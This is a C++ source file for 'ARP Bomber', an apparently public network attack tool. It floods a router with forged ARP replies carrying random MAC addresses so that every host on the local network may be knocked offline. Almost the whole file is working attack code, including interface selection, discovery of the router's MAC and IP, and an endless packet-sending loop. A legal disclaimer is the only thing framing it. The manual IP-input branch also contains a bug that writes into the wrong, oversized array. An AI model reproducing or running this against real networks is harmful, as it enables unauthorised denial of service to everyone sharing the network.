/*
Description:    This program Sends a lot of fake ARP replies
.               to the router, which makes it EXTREMELY confused.
.               This may kick everyone out of the network! (ツ)
Author:         Hanson (SweetIceLolly)
Website:        https://github.com/SweetIceLolly/arp_bomber
File:           arp_bomber.cpp

---------------------------------------------------------------------
|                             WARNING                               |
|       It is illegal to use this application against networks      |
|       for which you don't have permission. You can use it only    |
|       on YOUR network or a network that you are authorized to.    |
|       I wrote this program for learning purposes only. I am not   |
|       responsible for how you use this application and any        |
|       damages you may cause.                                      |
|       CONSIDER YOURSELF WARNED.                                   |
---------------------------------------------------------------------
*/

#include "arp_packet.hpp"
#include "net_interface.hpp"
#include <cstdlib>
#include <time.h>

/*
Purpose:    Generate a random MAC address
Return:     A randomly generated MAC address
*/
mac_addr generate_random_mac() {
    mac_addr    rtn;
    for (int i = 0; i < 6; i++) {
        rtn[i] = rand() % 0xff;
    }
    return rtn;
}

int main(int argc, char *argv[]) {
    printf("\n"
           "ARP Bomber by Hanson (SweetIceLolly)\n"
           "Website: https://github.com/SweetIceLolly/arp_bomber\n"
           "\n"
           "This program Sends a lot of fake ARP replies\n"
           "to the router, which makes it EXTREMELY confused.\n"
           "This may kick everyone out of the network! (^-^)\n"
           "\n"
           "---------------------------------------------------------------------\n"
           "|                             WARNING                               |\n"
           "|       It is illegal to use this application against networks      |\n"
           "|       for which you don't have permission. You can use it only    |\n"
           "|       on YOUR network or a network that you are authorized to.    |\n"
           "|       I wrote this program for learning purposes only. I am not   |\n"
           "|       responsible for how you use this application and any        |\n"
           "|       damages you may cause.                                      |\n"
           "|       CONSIDER YOURSELF WARNED.                                   |\n"
           "---------------------------------------------------------------------\n"
           "\n");

    //===================================================================================
    //List all network interfaces
    int interface_count;
    std::vector<struct ifaddrs> interface_list = list_net_interfaces(&interface_count);
    if (interface_count == 0) {
        printf("Failed to list interfaces!\n");
        return 1;
    }
    printf("\t#\tInterface\t\tWireless?\n"                //Table header
           "-------------------------------------------------------------------\n");
    for (int i = 0; i < interface_count; i++) {
        printf("\t%i\t%s\t\t\t%s\n", i, interface_list[i].ifa_name,
               check_interface_wireless(interface_list[i].ifa_name) ? "Yes" : "No");
    }

    //===================================================================================
    //Ask the user to select an interface
    int selected_index = -1;
    while (selected_index < 0 || selected_index >= interface_count) {
        printf("Select the interface you want to use: ");
        scanf("%i", &selected_index);
    }

    //===================================================================================
    //Create a ARP socket
    arp_socket  arpsocket;
    if (arpsocket.create(interface_list[selected_index].ifa_name) == -1) {
        printf("Failed to create ARP socket! Run me as root plz~\n");
        return 1;
    }

    //===================================================================================
    //Get router MAC address
    mac_addr    router_mac = get_gateway_mac();
    mac_addr    comparison = { 0 };
    bool        manually_input = false;
    char        answer;

    if (!memcmp(&router_mac, &comparison, sizeof(mac_addr))) {  //Check if get_gateway_mac is succeed
        manually_input = true;
        printf("Failed to get router MAC! Please input it manually.\n");
    }

    //Ask the user if this is the correct router MAC
    if (!manually_input) {                                      //Manual input not required
        do {
            printf("Is this your router MAC address: %02x:%02x:%02x:%02x:%02x:%02x (y/n)? ",
                                   router_mac[0], router_mac[1], router_mac[2],
                                   router_mac[3], router_mac[4], router_mac[5]);
            scanf(" %c", &answer);
            answer |= 32;                                               //Convert input to lower case
        } while (answer != 'y' && answer != 'n');
        if (answer == 'n') {
            manually_input = true;
        }
    }

    if (manually_input) {                                       //Manual input required
        int             temp_data[6];                               //Integer data for unsigned char conversion
        printf("Input your router MAC address (e.g. aa:bb:cc:dd:ee:ff): ");
        scanf("%x:%x:%x:%x:%x:%x", &temp_data[0], &temp_data[1], &temp_data[2],
                                   &temp_data[3], &temp_data[4], &temp_data[5]);
        for (int i = 0; i < 6; i++) {
            router_mac[i] = temp_data[i];
        }
    }
    printf("OK. Your router MAC address is: %02x:%02x:%02x:%02x:%02x:%02x\n",
                                   router_mac[0], router_mac[1], router_mac[2],
                                   router_mac[3], router_mac[4], router_mac[5]);

    //===================================================================================
    //Get router IP address
    ip_addr     router_ip = get_gateway_ip();
    manually_input = false;

    if (!memcmp(&router_ip, &comparison, sizeof(ip_addr))) {    //Check if get_gateway_ip is succeed
        manually_input = true;
        printf("Failed to get router IP! Please input it manually.\n");
    }

    //Ask the user if this is the correct router IP
    if (!manually_input) {                                      //Manual input not required
        do {
            printf("Is this your router IP address: %i.%i.%i.%i (y/n)? ",
                             router_ip[0], router_ip[1],
                             router_ip[2], router_ip[3]);
            scanf(" %c", &answer);
            answer |= 32;                                               //Convert input to lower case
        } while (answer != 'y' && answer != 'n');
        if (answer == 'n') {
            manually_input = true;
        }
    }

    if (manually_input) {                                       //Manual input required
        int             temp_data[4];                               //Integer data for unsigned char conversion
        printf("Input your router IP address (e.g. 192.168.168.1): ");
        scanf("%i.%i.%i.%i", &temp_data[0], &temp_data[1],
                             &temp_data[2], &temp_data[3]);
        for (int i = 0; i < 6; i++) {
            router_mac[i] = temp_data[i];
        }
    }
    printf("OK. Your router IP address is: %i.%i.%i.%i\n",
                             router_ip[0], router_ip[1],
                             router_ip[2], router_ip[3]);

    //===================================================================================
    //ATTACK!
    arp_packet  packet;                                     //Our ARP packet
    ip_addr     victim_ip = router_ip;                      //Victim IP
    time_t      prev_time = time(NULL);                     //Record start time
    time_t      curr_time = prev_time;                      //Current time
    uint        packet_count = 0;

    printf("BOMBING STARTED!!!\n");
    srand(curr_time);

    /*
    Packet structure:
    Destination MAC:    Router MAC
    Source MAC:         Random MAC
    Opcode:             0x2 (ARP reply)
    Sender MAC:         Random MAC, the same as Source MAC
    Sender IP:          Victim IP (e.g. 192.168.169.x, where 1 <= x < 255)
    Target MAC:         Router MAC
    Target IP:          Router IP
    */
    packet.destination_mac_addr = router_mac;
    packet.target_mac_addr = router_mac;
    packet.target_ip_addr = router_ip;
    packet.sender_ip_addr = router_ip;                      //Use router IP as base (e.g. 192.168.168.x, where 1 <= x < 255)
    packet.opcode[1] = 0x2;                                 //ARP reply
    for (;;) {
        packet.source_mac_addr = generate_random_mac();
        packet.sender_mac_addr = packet.source_mac_addr;
        packet.sender_ip_addr[3]++;                             //This assumes the last digit of IP is the chaning part
        if (packet.sender_ip_addr[3] > 254) {
            packet.sender_ip_addr[3] = 1;
        }
        
        if (arpsocket.send(packet, packet.source_mac_addr) == -1) {
            printf("send() failed!\n");
            return 1;
        }

        packet_count++;
        curr_time = time(NULL);
        if (curr_time - prev_time >= 2) {                       //Show packet count every 2 seconds
            prev_time = curr_time;
            printf("%i packets sent!\n", packet_count);
        }
        usleep(50000);                                          //Sleep 50ms
    }

    return 0;
}
